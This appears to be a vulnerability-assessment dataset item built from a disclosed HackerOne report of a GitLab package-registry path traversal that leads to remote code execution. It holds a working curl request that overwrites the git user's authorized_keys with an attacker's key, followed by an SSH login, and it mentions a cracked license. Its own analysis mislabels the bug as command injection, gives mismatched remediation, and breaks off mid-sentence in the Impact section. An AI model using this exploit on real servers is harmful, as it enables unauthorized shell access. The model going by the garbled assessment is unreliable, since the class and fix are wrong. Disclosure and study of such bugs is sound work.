# CMDI — h1

- source: h1
- class: cmdi
- cwe: CWE-77
- severity: high
- program: gitlab
- quality_score: 13

## Scenario

Analyze the following vulnerability report and provide a structured security assessment.

**Report Title:** Path traversal, to RCE
**Affected Asset:** Your Own GitLab Instance

**Vulnerability Description:**
### Summary
This one is similar to #732330 but much simpler.
A path traversal issue in GitLab package registry API allow an attacker to write any file at any location writable to user git in a GitLab server.

### Steps to reproduce

1. Enable package registry in your GitLab instance.
2. Create a project (package registry is enabled by default)
3. Create a private token to call the API
4. Send the following request

```
curl -H "Private-Token: $(cat token)" http://[REDACTED_PRIVATE_IP]/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.pub
```
Then run `ssh git@[REDACTED_PRIVATE_IP]` to enjoy a shell.

### Examples

{F630231}

In my setup, I did't expose the 22 port of GitLab docker container, so I logged in the server with its docker IP, [REDACTED_PHONE]. In case there's any misunderstandings.

#### Results of GitLab environment info

```
$ gitlab-rake gitlab:env:info

System information
System:		
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.6.3p62
Gem Version:	2.7.9
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	3.2.12
Git Version:	2.22.0
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.4.2-ee
Revision:	a3170599aa2
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.9
URL:		http://[REDACTED_PRIVATE_IP]
HTTP Clone URL:	http://[REDACTED_PRIVATE_IP]/some-group/some-project.git
SSH Clone URL:	git@[REDACTED_PRIVATE_IP]:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	10.2.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

```
# my docker-compose.yml
version: '3'
services:
  web:
    image: 'gitlab/gitlab-ee:latest'
    restart: always
    hostname: 'localhost'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://[REDACTED_PRIVATE_IP]'
        gitlab_rails['packages_enabled'] = true
    ports:
      - '[REDACTED_PRIVATE_IP]:80:80'
  #    - '[REDACTED_PRIVATE_IP]:22:22'
    volumes:
      - './config:/etc/gitlab'
      - './logs:/var/log/gitlab'
      - './data:/var/opt/gitlab'
      - ./crack/pub.pem:/opt/gitlab/embedded/service/gitlab-rails/.license_encryption_key.pub:ro
```
Please forgive me to use a crack on my self hosted testing purpose GitLab EE instance :)

## Impact

This path traversal issue could be easily exploited by overwriting some critical files related to server access. In my example I use authorized_keys of git user to 

## Analysis / Response

**Vulnerability Class:** cmdi
**CWE:** CWE-77
**Weakness:** Command Injection - Generic
**Severity:** high
**Endpoint Pattern:** http://10.26.0.5/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e

**Impact Assessment:**
This path traversal issue could be easily exploited by overwriting some critical files related to server access. In my example I use authorized_keys of git user to enable the shell access for the attacker.

**Remediation:**
Avoid passing user input to system commands. Use language-native APIs instead of shell execution. If unavoidable, use strict allowlists for permitted values.
